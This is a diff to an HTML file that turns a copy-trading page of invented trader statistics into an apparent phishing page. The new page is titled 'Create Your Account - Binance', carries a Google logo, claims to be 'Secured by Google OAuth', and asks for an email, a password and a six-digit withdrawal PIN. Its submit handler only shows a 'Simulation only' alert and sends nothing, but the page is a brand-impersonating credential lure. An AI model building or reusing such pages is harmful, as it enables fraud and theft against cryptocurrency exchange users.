@@ -3,161 +3,297 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Top Traders - Copy Trading</title>
+    <title>Create Your Account - Binance</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root {
-            --bg-dark: #1e2329;
-            --card-bg: #2b3139;
-            --text-main: #eaecef;
-            --text-muted: #848e9c;
-            --green: #0ecb81;
-            --gold: #f0b90b;
-            --border-radius: 12px;
+        /* --- CSS STYLES --- */
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: 'Inter', -apple-system, system-ui, sans-serif;
-            margin: 0;
-            padding: 40px 20px;
-        }
-
-        h2 { margin-left: 20px; font-weight: 600; }
-
-        /* Scrollable Container */
-        .scroll-container {
+            background-color: #0b0e11;
+            /* Subtle dark gradient similar to the image */
+            background-image: radial-gradient(circle at 20% 30%, #1e2329 0%, #0b0e11 100%);
             display: flex;
-            overflow-x: auto;
-            gap: 16px;
-            padding: 20px;
-            scroll-behavior: smooth;
-            -webkit-overflow-scrolling: touch;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
         }
 
-        .scroll-container::-webkit-scrollbar { height: 6px; }
-        .scroll-container::-webkit-scrollbar-thumb { background: #474d57; border-radius: 10px; }
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
 
         .card {
-            background-color: var(--card-bg);
-            border-radius: var(--border-radius);
-            min-width: 320px;
-            padding: 20px;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 32px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .logo {
+            width: 36px;
+            margin-bottom: 12px;
+        }
+
+        h1 {
+            font-size: 22px;
+            color: #1e2329;
+            margin: 0 0 8px 0;
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: 13px;
+            color: #707a8a;
+            margin: 0;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #1e2329;
+        }
+
+        .input-wrapper {
             position: relative;
-            flex-shrink: 0;
-            transition: transform 0.2s;
+            display: flex;
+            align-items: center;
         }
 
-        .card:hover { transform: translateY(-5px); background-color: #323942; }
-
-        .badge {
-            background-color: #363c46;
-            color: var(--text-main);
-            padding: 3px 12px;
-            border-top-left-radius: var(--border-radius);
-            border-bottom-right-radius: 10px;
-            font-size: 11px;
+        .input-wrapper i.prefix {
             position: absolute;
-            top: 0; left: 0;
+            left: 14px;
+            color: #aeaeae;
+            font-size: 14px;
         }
 
-        .header { display: flex; align-items: center; margin-top: 15px; margin-bottom: 20px; }
-
-        .avatar {
-            width: 48px; height: 48px;
-            border-radius: 50%;
-            margin-right: 12px;
-            object-fit: cover;
-            border: 2px solid #474d57;
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 40px;
+            border: 1px solid #eaecef;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
         }
 
-        .user-info h3 { margin: 0; font-size: 16px; color: var(--text-main); }
-
-        .user-stats { font-size: 12px; color: var(--text-muted); margin-top: 4px; }
-
-        .min-tag {
-            background-color: rgba(240, 185, 11, 0.1);
-            color: var(--gold);
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-size: 10px;
-            margin-left: 5px;
-            font-weight: bold;
+        .input-wrapper input:focus {
+            border-color: #f0b90b;
         }
 
-        .pnl-section { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 20px; }
-        .pnl-label { font-size: 11px; color: var(--text-muted); margin-bottom: 4px; }
-        .pnl-value { font-size: 20px; font-weight: bold; color: var(--green); }
-        .pnl-value span { font-size: 12px; font-weight: normal; margin-left: 2px; }
-
-        .mini-chart { width: 70px; height: 25px; border-bottom: 2px solid var(--green); opacity: 0.5; }
-
-        .stats-grid {
-            display: grid; grid-template-columns: 1fr 1fr 1fr;
-            border-top: 1px solid #3b424d;
-            padding-top: 15px;
+        .eye-icon {
+            position: absolute;
+            right: 14px;
+            color: #707a8a;
+            cursor: pointer;
         }
 
-        .stat-item label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 4px; }
-        .stat-item span { font-size: 13px; font-weight: 500; }
-        .positive { color: var(--green); }
+        /* Withdrawal PIN Section */
+        .pin-box {
+            background-color: #f8f9fa;
+            border-radius: 10px;
+            padding: 16px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        .pin-title {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            font-weight: 700;
+            color: #1e2329;
+            margin-bottom: 4px;
+        }
+
+        .pin-title i {
+            margin-right: 8px;
+            color: #707a8a;
+        }
+
+        .pin-box p {
+            font-size: 12px;
+            color: #707a8a;
+            margin: 0 0 12px 0;
+        }
+
+        .pin-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        /* Checkbox Area */
+        .terms-container {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            margin-bottom: 24px;
+        }
+
+        .terms-container input {
+            width: 18px;
+            height: 18px;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+
+        .terms-container a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        /* Button */
+        .btn-submit {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #166fe5;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 14px;
+            color: #707a8a;
+        }
+
+        .footer-text a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .bottom-security {
+            text-align: center;
+            color: #707a8a;
+            font-size: 11px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
 
-    <h2>Copy Trading For You</h2>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo.svg" alt="Google" class="logo">
+                <h1>Create Your Account</h1>
+                <p>Continue to Binance securely with your Google account</p>
+            </div>
 
-    <div class="scroll-container" id="trader-list">
-        </div>
-
-    <script>
-        const traders = [
-            { name: "TikDarkCoder", img: "https://i.pravatar.cc/150?u=1", pnl: "26,858.56", roi: "2.68", aum: "1,030,119.67", win: "100.00", subs: "16" },
-            { name: "TTMTT", img: "https://i.pravatar.cc/150?u=2", pnl: "327.81", roi: "42.51", aum: "120,284.44", win: "34.13", subs: "299" },
-            { name: "AbdullahBit", img: "https://i.pravatar.cc/150?u=3", pnl: "214.30", roi: "0.79", aum: "17,748.61", win: "76.47", subs: "2" },
-            { name: "Crypto_Libra", img: "https://i.pravatar.cc/150?u=4", pnl: "181.38", roi: "1.66", aum: "11,062.76", win: "74.19", subs: "0" },
-            { name: "Alex_Trades", img: "https://i.pravatar.cc/150?u=5", pnl: "12,450.20", roi: "15.40", aum: "450,000.00", win: "88.20", subs: "145" },
-            { name: "SarahCrypto", img: "https://i.pravatar.cc/150?u=6", pnl: "5,120.90", roi: "8.90", aum: "89,300.12", win: "92.00", subs: "300" },
-            { name: "BullRun_King", img: "https://i.pravatar.cc/150?u=7", pnl: "45,000.00", roi: "120.50", aum: "2,100,000.00", win: "65.40", subs: "280" },
-            { name: "MoonWalker", img: "https://i.pravatar.cc/150?u=8", pnl: "1,200.45", roi: "4.20", aum: "35,600.00", win: "81.00", subs: "45" },
-            { name: "ZenTrader", img: "https://i.pravatar.cc/150?u=9", pnl: "8,940.11", roi: "12.11", aum: "210,450.00", win: "95.50", subs: "12" },
-            { name: "Alpha_Signals", img: "https://i.pravatar.cc/150?u=10", pnl: "3,450.00", roi: "22.30", aum: "95,000.00", win: "70.00", subs: "190" },
-            { name: "MasterBit", img: "https://i.pravatar.cc/150?u=11", pnl: "19,200.75", roi: "5.45", aum: "670,000.00", win: "100.00", subs: "88" },
-            { name: "Elena_FX", img: "https://i.pravatar.cc/150?u=12", pnl: "6,700.30", roi: "31.20", aum: "140,000.00", win: "55.60", subs: "210" },
-            { name: "MacroWhale", img: "https://i.pravatar.cc/150?u=13", pnl: "105,400.00", roi: "1.20", aum: "15,000,000.00", win: "98.00", subs: "11" },
-            { name: "Scalp_God", img: "https://i.pravatar.cc/150?u=14", pnl: "980.50", roi: "65.00", aum: "12,000.00", win: "42.00", subs: "299" },
-            { name: "FuturePro", img: "https://i.pravatar.cc/150?u=15", pnl: "4,120.00", roi: "14.25", aum: "55,800.00", win: "89.00", subs: "156" }
-        ];
-
-        const container = document.getElementById('trader-list');
-
-        traders.forEach(t => {
-            const card = `
-                <div class="card">
-                    <div class="badge">Spot</div>
-                    <div class="header">
-                        <img src="${t.img}" class="avatar" alt="${t.name}">
-                        <div class="user-info">
-                            <h3>${t.name}</h3>
-                            <div class="user-stats">👤 ${t.subs} / 300 <span class="min-tag">Minimum 10USDT</span></div>
-                        </div>
-                    </div>
-                    <div class="pnl-section">
-                        <div>
-                            <div class="pnl-label">7D PNL (USDT)</div>
-                            <div class="pnl-value">+${t.pnl} <span>USDT</span></div>
-                        </div>
-                        <div class="mini-chart"></div>
-                    </div>
-                    <div class="stats-grid">
-                        <div class="stat-item"><label>ROI</label><span class="positive">+${t.roi}%</span></div>
-                        <div class="stat-item"><label>AUM</label><span>$${t.aum}</span></div>
-                        <div class="stat-item"><label>Win Rate</label><span>${t.win}%</span></div>
+            <form id="mainForm">
+                <div class="input-group">
+                    <label>Email Address</label>
+                    <div class="input-wrapper">
+                        <i class="fa-regular fa-envelope prefix"></i>
+                        <input type="email" placeholder="Enter your email" required>
                     </div>
                 </div>
-            `;
-            container.innerHTML += card;
+
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-lock prefix"></i>
+                        <input type="password" id="passwordField" placeholder="Enter your password" required>
+                        <i class="fa-regular fa-eye eye-icon" id="togglePassword"></i>
+                    </div>
+                </div>
+
+                <div class="pin-box">
+                    <div class="pin-title">
+                        <i class="fa-solid fa-shield-halved"></i> Withdrawal PIN (6 digits)
+                    </div>
+                    <p>This PIN will be used to authorize withdrawals.</p>
+                    
+                    <div class="pin-grid">
+                        <div class="input-group">
+                            <label>Create PIN</label>
+                            <div class="input-wrapper">
+                                <i class="fa-solid fa-table-cells prefix"></i>
+                                <input type="password" maxlength="6" class="pin-input" placeholder="Enter 6-digit PIN">
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label>Confirm PIN</label>
+                            <div class="input-wrapper">
+                                <i class="fa-solid fa-table-cells prefix"></i>
+                                <input type="password" maxlength="6" class="pin-input" placeholder="Re-enter PIN">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="terms-container">
+                    <input type="checkbox" id="terms" checked>
+                    <label for="terms">I agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></label>
+                </div>
+
+                <button type="submit" class="btn-submit">Create Account</button>
+            </form>
+
+            <div class="footer-text">
+                Already have an account? <a href="#">Sign in</a>
+            </div>
+        </div>
+
+        <div class="bottom-security">
+            <i class="fa-solid fa-circle-check"></i> Secured by Google OAuth • Protected by Binance
+        </div>
+    </div>
+
+    <script>
+        // Toggle Password Visibility
+        const togglePassword = document.querySelector('#togglePassword');
+        const password = document.querySelector('#passwordField');
+
+        togglePassword.addEventListener('click', function (e) {
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        // Ensure PIN inputs only accept numbers
+        const pinInputs = document.querySelectorAll('.pin-input');
+        pinInputs.forEach(input => {
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+        });
+
+        // Form Submit simulation
+        document.getElementById('mainForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Form submitted! (Simulation only)');
         });
     </script>
+
 </body>
 </html>
